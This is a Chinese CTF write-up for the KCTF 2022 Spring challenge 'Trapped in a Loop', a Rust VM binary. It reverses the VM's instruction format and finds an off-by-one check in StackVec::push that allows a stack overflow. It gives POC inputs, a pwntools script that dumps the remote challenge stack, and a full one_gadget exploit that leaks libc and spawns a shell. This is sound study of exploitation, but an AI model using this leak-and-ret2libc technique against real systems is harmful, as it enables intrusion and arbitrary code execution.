# 看雪 2022 KCTF 春季赛 第十题 陷入轮回

------

写在前面：

 

此题漏洞利用很简单，难点在找到漏洞以及搞清楚合法输入的格式。不恰当的说，也许算披着pwn外衣的reverse题？

 

另外感谢出题人放弃了精致分保留符合和调试信息，毕竟Rust逆向的恶心程度不是一般的高。

### 逆向输入格式

程序运行起来后随便输入些东西，基本一直处于循环状态不会报错，因此第一步需要逆清楚合法的输入格式是怎样的。

 

`vmvec::main::h1f88fe21e640590d` 的输入循环的部分代码如下：

```
alloc::string::String::new::h1069c1a7de8a2dc9(&buf);
std::io::BufRead::read_line::hfe23df61b51ffee1(&v25, &v17, &buf);
v3.length = (usize)"read row and col error!src/main.rs$#Something went wrong\n";
v3.data_ptr = (u8 *)&v25;
core::result::Result$LT$T$C$E$GT$::expect::h2fd8ef81211a9afd(v14, v3);
v4 = _$LT$alloc..string..String$u20$as$u20$core..ops..deref..Deref$GT$::deref::hc6a77192103af283(
       (_str *)&buf,
       (alloc::string::String *)"read row and col error!src/main.rs$#Something went wrong\n");
v26.data_ptr = (u8 *)core::str::_$LT$impl$u20$str$GT$::trim::hb020d7db36258e87(v4, (_str)__PAIR128__(v5, v5));
v26.length = v6;
if ( core::cmp::impls::_$LT$impl$u20$core..cmp..PartialEq$LT$$RF$B$GT$$u20$for$u20$$RF$A$GT$::ne::hc896b82329ee01be(
       &v26,                                // <input str>
       (_str *)&stru_841B0.data.value[19]) )// "$"
{
```

函数名和调试信息对分析的帮助非常大。IDA 的 Structures 标签（Shift+F9） 和 Local Types 标签（Shift+F11）列出了所有的结构体类型。

 

可以看出，Rust 的 string 的基本结构是 8 字节的 data_ptr + 8 字节的 length，不需要 '\0' 作为结尾。

 

下面的 if 判断条件调用了 ...cmp...ne.. 函数，两个参数类型都是 string *。第二个参数是常量，结合 string 的结构可知是 "$"。动态调试也可确这一点。

> Linux 下使用 GDB 动态调试，推荐结合 [pwndbg](https://bbs.kanxue.com/elink@649K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6H3N6$3&6V1j5X3N6Q4x3V1k6H3N6$3&6V1j5X3M7`.) 等插件使用，最大的优点是可以看多级指针（telescope命令），查看包含指针的结构体时极大的增加了效率。
> 例如在这个 if 处下断点（brva 0x3195d），然后输入 "123456789"：
>
> ```
> pwndbg> telescope $rdi 2
> 00:0000│ rdi 0x7ffffffed718 —▸ 0x8088b10 ◂— 0x3837363534333231 ('12345678')
> 01:0008│     0x7ffffffed720 ◂— 9 /* '\t' */
> ```
>
> 可以清楚地看到`[rdi]`是data_ptr，`[rdi+8]`是length。
>
> （我没有在 x64dbg 里找到同样的功能，这导致 Windows 上的调试体验相当难受（所以前面的 Windows 逆向题都是先静态硬看反编译结果，直到不得已才动态调试）。如果 x64dbg 有相同功能的插件求推荐）
>
> （发现 KCTF 似乎从来没有过 Linux 逆向题，这是为什么呢？）
>
> （另：调试时 pwndbg 可能会报错 "No type named int16"，原因未知，但根据这个 [issue](https://bbs.kanxue.com/elink@99bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6H3N6$3&6V1j5X3N6Q4x3V1k6H3N6$3&6V1j5X3N6Q4x3V1k6A6M7%4y4#2k6i4y4Q4x3V1j5^5y4e0f1%60.) 的方法用 `set language c` 命令可以解决 ）

 

经过对main函数的逆向，得知输入内容将会保存在一个string的二维数组 `vec<vec<string> >` 中，分为了若干个块，每个块包含若干个行。
`#` 和 `$` 是两个特殊的输入行，遇到 `$` 会结束当前块并开启下一个块，遇到 `#` 会结束当前块并跳出循环。

 

然后前面的二维数组会作为第一个参数传入 `vmvec::start_vec::h1393dc29498ce194`。

 

这个函数有大量对 `core::str::traits::_$LT$impl$u20$core..cmp..PartialEq$u20$for$u20$str$GT$::eq::hbc53f1d0564063a8` （...cmp...eq...）的调用。静态分析结合动态调试，发现这些位置检查的是输入行按空格切分后的第一个单词。提取出这些待比较的常量：

```
//
vec
adj
print
cal
cmd
jmp
je
switch_stack
halt
```

可以看出这是一个自定义的虚拟机，程序要求的输入是虚拟机的指令，合法指令只有上面几种。

 

继续逆向每个指令的处理函数,结合之前一些变量的初始化，对虚拟机的结构和指令的格式和作用有了大概的印象：

 

虚拟机结构：

- 两个栈，分别是 `vmvec::lib::StackVec<[u64_ 32]>` 和 `vmvec::lib::StackVec<[u64_ 64]>`，即容量为32的 u64 数组和容量为 64 的 u64 数组。`switch_stack` 指令可以切换当前使用的栈
- 一个整数组 `vec<u64>`
- 一个字符串组 `vec<string>`
- 一组hash表，分别映射了字符串名称与其他部分，如栈、字符串组、整数组等

部分指令的结构：

- vec int >>,0,1,2,3,
  - 把后面的数字依次放入当前的栈里
  - 注意数字的最前和最后都有逗号，否则会丢失字符
- vec xxx int >>,0,1,2,3,
  - xxx 是任意字符串，会创建一个新的数组然后以xxx为key存入hashmap
- vec str ... 与 vec xxx str ... ：与上面类似
- adj
  - 各种调整命令，可以修改栈、各种数值、hashmap，非常复杂
  - adj clear_stack ???：清除栈，最简单的指令。???是任意字符串，只要不等于"int"和"str"似乎具体值就没有意义
  - adj stack_move i：把StackVec顶部的元素插入到第i个位置
- print
  - 打印当前栈顶的值
- print xxx int 和 print xxx str
  - 从hashmap中取出某个数组，打印全部内容
- cal：计算指令，结构相对简单
  - 第一个参数是运算类型：add, sub, mul, div
  - 第二个参数是数据源与数据目标地址：stack, reg, stack_to_reg, reg_to_stack
    - 顾名思义，stack是从栈里取两个数，然后计算结果也保存在栈上；stack_to_reg是从栈里取两个数，计算结果保存在一个代表寄存器的全局整数组里

（会有部分assert检查输出panic信息，例如指令的参数不完整，或者栈为空时print等情况，可以辅助理解）

 

试图搞清楚这些指令的格式以及功能花费了不少时间，然而还是未能完全搞懂（例如全局的几个hashmap与计算指令之间的交互等）

## 发现漏洞所在

尝试换个角度思考：众所周知，Rust是一门内存安全的语言，能产生漏洞被pwn掉只有两种可能：编译器有bug；用了unsafe。

 

如果真是前者，那题目就过于硬核了。从程序中的字符串看到编译器版本是1.51.0，不算很低（虽然也不新）
搜索 Rust PWN 能找到两道 CTF 题的 Writeup：[Hack.lu CTF 2021 Writeup by r3kapig](https://bbs.kanxue.com/elink@c4aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0t1#2z5o6l9^5x3H3%60.%60.) 和 [[原创\]虎符网络安全赛道 2022-pwn-vdq-WP](https://bbs.pediy.com/thread-271978.htm) ，都是利用了 CVE-2020-36318，1.48 版本 VecDeque 的 make_contiguous 漏洞，显然本题的编译器版本更高不存在此问题。

 

那么大概率就是本题有 unsafe 代码。注意到程序里有几处直接调用了 `memcpy` 有些可疑，通常高级别的 Rust 代码不会直接调用这么低级别的函数。

 

而且，`vmvec::start_vec::h1393dc29498ce194` 里调用 `memcpy` 前后的代码看起来总有些怪怪的感觉。这部分代码处理的是 `StackVec` 结构，于是在左侧函数列表找 `vmvec::lib::StackVec` 开头的函数名逐一查看。

 

在 `vmvec::lib::StackVec$LT$A$GT$::push::h91793a492ee0ad43` 发现了漏洞所在（`vmvec::lib::StackVec$LT$A$GT$::push::h6dc540cb15a3a7ea` 同理）：

```
v5 = vmvec::lib::StackVec$LT$A$GT$::len::h34d63a184be2bedd(self);
if ( v5 > vmvec::lib::StackVec$LT$A$GT$::capacity::he837472c501b6732(self) )
  core::panicking::panic::h07405d6be4bce887();
```

这个函数的作用是向 StackVec 中添加一个元素，先检查当前的 len 是否**大于** capacity，而当 len 等于 capacity 时能通过检查，但是后面的写入就会越界一个位置。正确的检查应该是看 len 是否**大于等于** capacity。

 

回头看 `vmvec::start_vec::h1393dc29498ce194` 里调用 `memcpy` 前后的代码，这里把两个 StackVec 通过 `memcpy` 连在一起放到了栈上。

 

从 IDA Structure 标签中看 StackVec 结构的定义：

```
00000000 vmvec::lib::StackVec<[u64_ 32]> struc ; (sizeof=0x108, align=0x8, copyof_188)
00000000                                         ; XREF: .data.rel.ro:stru_841B0/r
00000000                                         ; vmvec::Vars/r ...
00000000 length          dq ?
00000008 data            core::mem::manually_drop::ManuallyDrop<[u64_ 32]> ?
00000008                                         ; XREF: vmvec::jump::je::hb89aefc0d9276b18:loc_FE02/o
00000008                                         ; _$LT$core..option..Option$LT$T$GT$$u20$as$u20$core..fmt..Debug$GT$::fmt::h69f4e878c701aa9f:loc_302F5/o ...
00000108 vmvec::lib::StackVec<[u64_ 32]> ends
```

因此，前面的 StackVec 溢出一个元素正好能修改掉后面的 StackVec 的 length，从而让它的覆盖范围变大，这样通过后面的 StackVec 即可溢出访问到程序栈后面的全部内容。

## 完成漏洞利用

前面的 StackVec 容量为 64，可以利用 `vec int >>` 命令插入 65个元素，然后 `switch_stack` 切换栈，再 `print` 输出栈顶元素。POC如下：

```
vec int >>,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,1000,
switch_stack
print
#
```

成功输出了1000位置上的元素，因此这种利用方式有效。

 

可以修改栈的情况下，劫持控制流的常用方式是修改栈上的返回地址。为了启动shell还需要借助libc的函数，因此要知道libc的地址。

> Linux上动态链接的程序的执行流程：entrypoint (ld.so) -> _start (program) -> **libc_start_main (libc) -> main (program)
> main 函数被 libc 里的** libc_start_main 函数调用，这会在栈上留下返回地址，即 __libc_start_main_ret，是一个位于 libc 内部的地址

 

本地调试，在 `vmvec::start_vec::h1393dc29498ce194` 里调用 `memcpy` 的前后下断点，找出第二个 StackVec 的起始地址和栈上 __libc_start_main_ret 的地址，计算出二者之间的距离是 645 个 u64 。

 

修改下POC即可打印出__libc_start_main_ret的值：

```
vec int >>,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,646,
switch_stack
print
#
```

> （又是一道不给libc的题目）

 

程序中有 `"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0"` 字符串，但是本地 Ubuntu 20.04 上 libc-2.31 的 __libc_start_main_ret 的后三位却不一样。上 libc database 搜索发现是 libc6_2.23-0ubuntu11.2_amd64 和 libc6_2.23-0ubuntu11.3_amd64 （疑惑，部署环境与编译环境不一样？？）。

 

写个小程序把远程环境的栈 dump 出来：（adj 可能有直接调整 StackVec的功能，但是不想再逆向了，所以暴力一些直接不断 adj clear_stack 清除 StackVec再重新溢出）

```
from pwn import *
 
t = '''vec int >>,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,57,51,52,53,54,55,56,57,58,59,60,61,62,63,{},
switch_stack
print
switch_stack
adj clear_stack ???
'''
 
s = remote("221.228.109.254", 10038)
s.recvuntil(b"Now,tell me your answer.\n\n")
 
r = ""
for i in range(640, 670):
    r += t.format(i)
 
r += "#\n"
 
print(r)
s.send(r)
 
while True:
    line = s.recvline(timeout=3)
    if not line.startswith(b"clear stack"):
        print(hex(int(line)))
 
s.interactive()
```

得到的是 StackVec 第 639-669 项：

```
0x1
0x7ffd93e7d9c8
0x563965d4a54a
0x7ffd93e7d9c0
0x100000000000000
0x7ffd93e7d9c8
0x7fdbe3d18840    -> libc_start_main_ret，libc6_2.23-0ubuntu11.2_amd64 or libc6_2.23-0ubuntu11.3_amd64
0x7ffd93e7d910  -> rsp (when main return)
0x7ffd93e7d9c8
0x193e7d914
0x563965d4a520  -> main
0x0
0x2df777e3b8b5a760
0x563965d1e080  -> _start ; rsp+0x30
0x7ffd93e7d9c0
0x0
0x0
0x7e7e9b83c115a760  -> rsp+0x50
0x7e327bef7f05a760
0x0
0x0
0x0  -> rsp+0x70
0x7ffd93e7d9d8
0x7fdbe4920168
0x7fdbe470980b
0x0
0x0
0x563965d1e080
0x7ffd93e7d9c0
0x0
```

远程环境是 libc-2.23 是一个利好消息，因为 libc-2.23 的 `one_gadget` 非常好用（libc-2.31 的 `one_gadget` 条件很苛刻），从栈的布局来看 main 函数 ret 后 [rsp+0x70] == 0 满足条件

 

从 libc6_2.23-0ubuntu11.3_amd64.so 提取出 __libc_start_main_ret 位于偏移 0x20840，[rsp+0x70] == NULL\ 的 one_gadget 位于偏移 0xf1247。
0xf1247-0x20840 = 854535，所以只要把libc_start_main_ret加上854535 就成为了one gadget，return 后即可直接 getshell。

 

最终的exp如下：
（adj也许有立即数直接push_back到StackVec或调整StackVec大小的方法，但是不想逆向了，借助 cal add stack_to_reg 和 cal add reg_to_stack 中转两次也可以达到目的；cal add stack 是 StackVec[len-1] = StackVec[len-2] + StackVec[len-3]，但完成加法后 len 会加1，所以再一次调整StackVec的长度）

```
vec int >>,854535,0,0,
cal add stack_to_reg
adj clear_stack ???
vec int >>,0,0,0,
cal add stack_to_reg
adj clear_stack ???
vec int >>,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,647,
switch_stack
cal add reg_to_stack
cal stack_move 646
cal add stack
switch_stack
adj clear_stack ???
vec int >>,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,648,
switch_stack
cal stack_move 645
#
```